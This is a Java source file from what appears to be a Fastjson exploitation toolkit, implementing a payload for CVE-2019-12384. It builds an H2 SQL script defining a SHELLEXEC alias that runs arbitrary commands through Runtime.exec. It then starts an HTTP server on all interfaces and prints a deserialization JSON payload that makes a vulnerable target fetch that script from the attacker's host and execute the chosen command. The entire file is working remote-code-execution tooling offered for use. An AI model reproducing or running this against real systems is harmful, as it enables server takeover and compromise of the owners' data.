package payloads;

import payloads.annotation.Dependencies;
import payloads.annotation.PayloadType;
import payloads.annotation.VulVersion;
import server.CodebaseServer;
import util.Common;
import util.JarFileReader;
import util.Util;

import java.io.IOException;

@VulVersion({"CVE-2019-12384"})
@PayloadType({PayloadType.HTTP})
@Dependencies({"com.h2database:h2:1.4.199"})
public class DriverManagerConnectionSource1 implements ObjectPayload{
    @Override
    public void process(String[] args) throws IOException {
        if(args.length < 3){
            System.out.println(String.format("[*] Usage: java -jar FastjsonExploit-[version].jar DriverManagerConnectionSource1 [hostname] [cmd]"));
            return;
        }

        String host = args[1].trim();
        int http_port = Util.getUnusePort("localhost");
        String cmd = args[2].trim();

        String sql = "CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {\n" +
                "\tString[] command = {cmd};\n" +
                "\tjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\");\n" +
                "\treturn s.hasNext() ? s.next() : \"\";  }\n" +
                "$$;\n" +
                "CALL SHELLEXEC('##CMD##')";
        Common.byteCode = sql.replace("##CMD##", cmd).getBytes();

        CodebaseServer.lanuchCodebaseURLServer("0.0.0.0", http_port);

        JarFileReader jarFileReader = new JarFileReader();
        String payload = jarFileReader.read("DriverManagerConnectionSource1.json");
        payload = payload.replace("##SQL##",String.format("http://%s:%d/Exploit.class",host, http_port));
        System.out.println("[*] payload build success!");
        System.out.println("\n" + payload + "\n");
    }
}
